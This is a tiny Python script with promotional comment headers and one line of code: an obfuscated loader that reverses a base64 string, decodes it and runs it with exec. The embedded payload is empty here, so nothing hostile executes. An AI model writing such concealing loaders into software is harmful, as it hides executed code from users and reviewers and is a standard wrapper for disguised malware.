# Created by MrUser#
#Made in Madagascar#
#Beta Version#
#Please Follow my Github account#
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))